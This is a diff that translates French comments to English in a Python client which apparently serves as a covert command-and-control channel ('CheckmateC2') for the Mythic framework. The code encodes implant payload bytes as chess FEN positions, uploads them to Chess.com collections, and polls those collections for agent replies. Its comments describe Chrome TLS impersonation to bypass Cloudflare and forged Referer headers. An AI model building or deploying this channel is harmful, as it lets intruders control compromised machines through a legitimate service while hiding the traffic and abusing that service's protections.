@@ -1,8 +1,8 @@
 """
-Client HTTP Chess.com (collections bibliothèque + PGN/FEN), aligné sur CheckmateC2.
+Chess.com HTTP client (library collections + PGN/FEN), CheckmateC2 compatible.
 
-Les GET depuis Python pur (httpx) subissent souvent un 403 Cloudflare (empreinte TLS).
-On utilise **curl_cffi** avec impersonate Chrome quand il est installé ; sinon repli httpx.
+Plain httpx GET requests often get a 403 from Cloudflare (TLS fingerprinting).
+Uses curl_cffi with Chrome impersonation when available, falls back to httpx.
 """
 
 from __future__ import annotations
@@ -31,7 +31,7 @@ PGN_TEMPLATE = (
     '[White "?"]\n[Black "?"]\n[Result "*"]\n[SetUp "1"]\n[FEN "{fen}"]\n\n*'
 )
 
-# Empreinte TLS navigateur (cf. `curl_cffi` — indispensable contre Cloudflare sur bien des IP).
+# Browser TLS fingerprint via curl_cffi - required to bypass Cloudflare on most IPs.
 IMPERSONATE = "chrome"
 
 USER_AGENT = (
@@ -43,7 +43,7 @@ SEC_CH_UA = '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"'
 
 
 def _headers_get(cookie: str, referer: str = "") -> dict[str, str]:
-    """Pas de Host manuel. Referer : même URL que dans le navigateur pour GET items (souvent exigé)."""
+    """No manual Host header. Referer must match the browser URL for the collection page."""
     ref = (referer or "").strip()
     if not ref:
         ref = "https://www.chess.com/analysis"
@@ -143,27 +143,20 @@ class ChessComClient:
 
         if resp.status_code == 403:
             txt = (getattr(resp, "text", "") or "")[:800]
-            hint = (
-                "cookie expiré, IP bloquée (datacenter/Cloudflare), ou curl_cffi absent dans l’image C2."
-            )
+            hint = "expired cookie, blocked IP (datacenter/Cloudflare), or curl_cffi missing from the C2 image."
             try:
                 err = json.loads(txt)
                 msg = str(err.get("message", "")).lower()
                 if "insufficient permissions" in msg:
                     hint = (
-                        "Chess.com refuse l’accès à cette collection : vérifie UUID + même compte que "
-                        "le cookie ; renseigne aussi le paramètre optionnel « library_referer » avec "
-                        "l’URL complète de la page collection ouverte dans le navigateur (ex. …/"
-                        "analysis/collection/…/games), identique au champ Referer de la requête "
-                        "réseau qui fonctionne — sans ça l’API renvoie souvent Insufficient permissions."
+                        "Chess.com denied access to this collection: check UUID + same account as the cookie. "
+                        "Also set the optional library_referer parameter to the full collection URL from your "
+                        "browser address bar (e.g. .../analysis/collection/.../games) - it must match the "
+                        "Referer header of the working network request, otherwise the API returns Insufficient permissions."
                     )
             except json.JSONDecodeError:
                 pass
-            logger.warning(
-                "chess list 403 — %s Corps (extrait): %s",
-                hint,
-                txt.replace("\n", " ")[:400],
-            )
+            logger.warning("chess list 403 - %s body (excerpt): %s", hint, txt.replace("\n", " ")[:400])
             return []
         if resp.status_code >= 400:
             logger.warning("chess list HTTP %s", resp.status_code)
@@ -172,7 +165,7 @@ class ChessComClient:
         try:
             payload = resp.json()
         except Exception as e:
-            logger.warning("chess list JSON invalide: %s", e)
+            logger.warning("chess list invalid JSON: %s", e)
             return []
 
         games: list[tuple[str, str]] = []
@@ -223,7 +216,7 @@ class ChessComClient:
             resp.raise_for_status()
 
     async def upload_payload(self, collection_id: str, payload: bytes) -> None:
-        """Encode *payload* (octets bruts renvoyés par Mythic) en jeux FEN puis envoi."""
+        """Encode raw Mythic payload bytes into FEN games and upload to the collection."""
         await self._sleep_jitter()
         await self.clear_collection(collection_id)
         encoded = Base5Chess.encode(payload)
@@ -237,8 +230,8 @@ class ChessComClient:
 
     async def wait_download_payload(self, collection_id: str) -> bytes:
         """
-        Attend une ligne complète (premier FEN = marqueur), comme downloadData côté listener CheckmateC2.
-        Retourne les octets à poster à /agent_message (chaîne base64 Mythic, en octets UTF-8).
+        Wait for a complete message (first FEN = marker), matching CheckmateC2 downloadData logic.
+        Returns the raw bytes to POST to /agent_message (Mythic base64 string as UTF-8 bytes).
         """
         poll_count = 0
         while True:
@@ -248,14 +241,14 @@ class ChessComClient:
             poll_count += 1
             if poll_count % 20 == 0:
                 logger.debug(
-                    "Toujours en attente de message agent sur %s (%s sondages, %s items visibles)",
+                    "Still waiting for agent message on %s (%s polls, %s items visible)",
                     collection_id,
                     poll_count,
                     len(games),
                 )
             await asyncio.sleep(3.0)
 
-        logger.debug("Marqueur détecté, %s jeux à décoder", len(games))
+        logger.debug("Marker detected, %s games to decode", len(games))
         out = ""
         for _game_id, fen in games:
             if fen == MARKER_FEN:
@@ -264,6 +257,6 @@ class ChessComClient:
             out += piece
         b5 = "".join(char for char in out.upper() if char in Base5Chess.ALPHABET)
         if not b5:
-            logger.warning("Aucun caractère Base5 trouvé dans les FEN — message vide ?")
+            logger.warning("No Base5 characters found in FEN data - empty message?")
             return b""
         return Base5Chess.decode(b5)
